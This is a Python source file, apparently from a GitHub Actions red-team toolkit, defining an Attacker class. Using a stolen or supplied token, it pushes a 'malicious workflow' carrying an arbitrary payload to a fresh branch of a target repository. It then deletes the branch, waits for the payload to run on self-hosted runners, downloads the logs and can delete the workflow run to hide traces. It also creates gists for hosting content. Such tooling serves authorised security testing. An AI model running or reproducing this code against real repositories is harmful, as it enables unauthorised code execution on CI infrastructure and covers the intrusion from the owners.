import logging
import random
import string
import asyncio

from gatox.github.api import Api
from gatox.attack.cicd_attack import CICDAttack
from gatox.cli.output import Output

logger = logging.getLogger(__name__)
logging.root.setLevel(logging.DEBUG)


class Attacker:
    """Class holding all high level logic for executing attacks on self-hosted
    runners.
    """

    def __init__(
        self,
        pat: str,
        socks_proxy: str = None,
        http_proxy: str = None,
        author_email: str = None,
        author_name: str = None,
        timeout: int = 30,
        github_url: str = None,
    ):
        self.api = Api(
            pat,
            socks_proxy=socks_proxy,
            http_proxy=http_proxy,
            github_url=github_url,
        )

        self.socks_proxy = socks_proxy
        self.http_proxy = http_proxy
        self.user_perms = None
        self.author_email = author_email
        self.author_name = author_name
        self.timeout = timeout
        self.github_url = github_url

    async def setup_user_info(self):
        """ """
        if not self.user_perms:
            self.user_perms = await self.api.check_user()
            if not self.user_perms:
                logger.error("This token cannot be used for attacks!")
                return False

            if self.author_email is None:
                self.author_email = (
                    f"{self.user_perms['user']}@users.noreply.github.com"
                )

            if self.author_name is None:
                self.author_name = self.user_perms["user"]

            Output.info(
                f"The authenticated user is: {Output.bright(self.user_perms['user'])}"
            )
            Output.info(
                "The GitHub Classic PAT has the following scopes: "
                f"{Output.yellow(', '.join(self.user_perms['scopes']))}"
            )

        return True

    async def create_gist(self, gist_name: str, gist_contents: str):
        """Create a Gist with the specified contents and return the raw URL."""
        await self.setup_user_info()

        if "gist" not in self.user_perms["scopes"]:
            Output.error("Unable to create Gist without gist scope!")
            return False

        random_id = "".join(random.choices(string.ascii_lowercase, k=5))

        gist_params = {
            "files": {f"{gist_name}-{random_id}": {"content": gist_contents}}
        }

        result = await self.api.call_post("/gists", params=gist_params)

        if result.status_code == 201:
            return (
                result.json()["id"],
                result.json()["files"][f"{gist_name}-{random_id}"]["raw_url"],
            )
        else:
            Output.error("Failed to create Gist!")

    async def execute_and_wait_workflow(
        self,
        target_repo: str,
        branch: str,
        yaml_contents: str,
        commit_message: str,
        yaml_name: str,
    ):
        """Utility method to wrap shared logic for pushing a workflow for a new
        branch, waiting for the workflow to execute, and getting the workflow
        ID of the completed workflow.

        Args:
            target_repo (str): Repository to target.
            branch (str): Branch to commit to.
            yaml_contents (str): Contents of yaml file.
            commit_message (str): Message for commit.
            yaml_name (str): Name of workflow yaml file to commit.

        Returns:
            str: Workflow ID if successful, None otherwise.
        """

        workflow_id = None

        if self.author_email and self.author_name:
            rev_hash = await self.api.commit_workflow(
                target_repo,
                branch,
                yaml_contents.encode(),
                f"{yaml_name}.yml",
                commit_author=self.author_name,
                commit_email=self.author_email,
                message=commit_message,
            )
        else:
            rev_hash = await self.api.commit_workflow(
                target_repo,
                branch,
                yaml_contents.encode(),
                f"{yaml_name}.yml",
                message=commit_message,
            )

        if not rev_hash:
            Output.error("Failed to push the malicious workflow!")
            return False

        Output.result("Succesfully pushed the malicious workflow!")

        for _ in range(self.timeout):
            ret = await self.api.delete_branch(target_repo, branch)
            if ret:
                break
            else:
                await asyncio.sleep(1)

        if ret:
            Output.result("Malicious branch deleted.")
        else:
            Output.error(f"Failed to delete the branch: {branch}.")

        Output.tabbed("Waiting for the workflow to queue...")

        for i in range(self.timeout):
            workflow_id = await self.api.get_recent_workflow(
                target_repo, rev_hash, yaml_name
            )
            if workflow_id == -1:
                Output.error("Failed to find the created workflow!")
                return
            elif workflow_id > 0:
                break
            else:
                await asyncio.sleep(1)
        else:
            Output.error("Failed to find the created workflow!")
            return

        Output.tabbed("Waiting for the workflow to execute...")

        for _ in range(self.timeout):
            status = await self.api.get_workflow_status(target_repo, workflow_id)
            if status == -1:
                Output.error("The workflow failed!")
                break
            elif status == 1:
                Output.result("The malicious workflow executed succesfully!")
                break
            else:
                await asyncio.sleep(1)
        else:
            Output.error("The workflow is incomplete but hit the timeout!")

        return workflow_id

    async def push_workflow_attack(
        self,
        target_repo,
        payload: str,
        custom_workflow: str,
        target_branch: str,
        commit_message: str,
        delete_action: bool,
        yaml_name: str = "sh_cicd_attack",
    ):
        await self.setup_user_info()

        if not self.user_perms:
            return False

        if (
            "repo" in self.user_perms["scopes"]
            and "workflow" in self.user_perms["scopes"]
        ):
            Output.info(
                f"Will be conducting an attack against {Output.bright(target_repo)} as"
                f" the user: {Output.bright(self.user_perms['user'])}!"
            )

            # Randomly generate a branch name, since this will run immediately
            # otherwise it will fail at the push.
            if target_branch is None:
                branch = "".join(random.choices(string.ascii_lowercase, k=10))
            else:
                branch = target_branch

            res = await self.api.get_repo_branch(target_repo, branch)
            if res == -1:
                Output.error("Failed to check for remote branch!")
                return
            elif res == 1:
                Output.error(f"Remote branch, {branch}, already exists!")
                return

            if custom_workflow:
                with open(custom_workflow, "r") as custom_wf:
                    yaml_contents = custom_wf.read()
            else:
                yaml_contents = CICDAttack.create_push_yml(payload, branch)

            workflow_id = await self.execute_and_wait_workflow(
                target_repo, branch, yaml_contents, commit_message, yaml_name
            )

            res = await self.api.download_workflow_logs(target_repo, workflow_id)
            if not res:
                Output.error("Failed to download logs!")
            else:
                Output.result(f"Workflow logs downloaded to {workflow_id}.zip!")

            if delete_action:
                res = await self.api.delete_workflow_run(target_repo, workflow_id)
                if not res:
                    Output.error("Failed to delete workflow!")
                else:
                    Output.result("Workflow deleted sucesfully!")
        else:
            Output.error(
                "The user does not have the necessary scopes to conduct this attack!"
            )
